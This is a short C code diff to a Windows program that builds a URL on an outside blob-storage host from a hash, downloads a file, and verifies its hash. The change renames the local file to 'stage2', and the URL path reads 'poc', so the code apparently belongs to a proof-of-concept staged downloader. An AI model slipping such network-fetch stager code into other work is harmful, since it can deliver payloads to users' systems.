@@ -6,7 +6,7 @@
 #pragma comment(lib, "Urlmon.lib")
 
 int __cdecl main() {
-  const char *destFile = "mn";
+  const char *destFile = "stage2";
 
   char path[1000];
   snprintf(path, 1000, "http://eirikbm.blob.core.windows.net/poc/%s", hash);
@@ -21,7 +21,7 @@ int __cdecl main() {
 
   printf("File downloaded, checking hash...\n");
   char newHash[256];
-  hashForFile("mn", newHash);
+  hashForFile("stage2", newHash);
   printf("Hash: %s\n", newHash);
   if (strcmp(hash, newHash) != 0) {
     printf("Hash did not match :(\n");
